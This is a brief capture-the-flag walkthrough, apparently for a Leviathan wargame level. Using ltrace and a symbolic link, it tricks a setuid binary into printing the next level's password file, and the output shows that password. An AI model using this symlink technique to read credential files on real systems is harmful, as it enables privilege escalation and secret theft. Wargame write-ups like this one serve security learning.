Here i used `ls-command`  to use symbolic links to get password 
```
leviathan5@gibson:~$ ls -al
total 36
drwxr-xr-x  2 root       root        4096 Apr 10 14:23 .
drwxr-xr-x 83 root       root        4096 Apr 10 14:24 ..
-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15144 Apr 10 14:23 leviathan5
-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x804910d, 1, 0xffffd464, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                                       = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                                                                 = 26
exit(-1 <no return ...>
+++ exited (status 255) +++

leviathan5@gibson:/tmp/tmp.PNAVgdDQpc$ ln -s /etc/leviathan_pass/leviathan6 file.log
leviathan5@gibson:/tmp/tmp.PNAVgdDQpc$ ls
file.log  
leviathan5@gibson:/tmp/tmp.PNAVgdDQpc$ mv file.log /tmp
leviathan5@gibson:/tmp/tmp.PNAVgdDQpc$ /home/leviathan5/./leviathan5
szo7HDB88w
```
